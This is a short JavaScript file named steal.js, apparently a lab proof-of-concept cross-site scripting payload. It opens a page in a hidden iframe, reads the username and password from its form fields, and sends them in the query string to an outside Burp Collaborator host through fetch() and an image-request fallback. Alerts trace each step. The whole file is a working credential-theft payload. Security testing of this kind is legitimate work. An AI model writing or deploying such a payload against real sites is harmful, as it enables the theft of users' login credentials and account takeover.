// steal.js - Verbose version with alerts
(function() {
    alert('Step 1: Loading password page...');
    
    // Create hidden iframe
    var iframe = document.createElement('iframe');
    iframe.src = '/web/guest/add';
    iframe.style.display = 'none';
    document.body.appendChild(iframe);
    
    iframe.onload = function() {
        alert('Step 2: Password page loaded!');
        
        setTimeout(function() {
            try {
                // Extract credentials
                var username = iframe.contentDocument.querySelector('input[name="fake_username"]').value;
                var password = iframe.contentDocument.querySelector('input[name="fake_password"]').value;
                
                // Show extracted data
                alert('Step 3: Password extracted!\n\nUsername: ' + username + '\nPassword: ' + password);
                
                // Send to Burp Collaborator
                var collab = 'https://m9wvitwtgk19gvfaojwmvuxw7nde15pu.oastify.com';
                
                alert('Step 4: Sending to Burp Collaborator...');
                
                fetch(collab + '/?user=' + encodeURIComponent(username) + '&pwd=' + encodeURIComponent(password))
                    .then(function() {
                        alert('Step 5: ✅ Successfully sent to Burp Collaborator!\n\nCheck: ' + collab);
                    })
                    .catch(function(err) {
                        alert('Step 5: ❌ Fetch failed: ' + err);
                    });
                
                // Backup image method
                var img = new Image();
                img.src = collab + '/?user=' + encodeURIComponent(username) + '&pwd=' + encodeURIComponent(password);
                document.body.appendChild(img);
                
            } catch(e) {
                alert('❌ Error extracting password: ' + e.message);
            }
        }, 3000);
    };
    
    iframe.onerror = function() {
        alert('❌ Failed to load password page!');
    };
})();
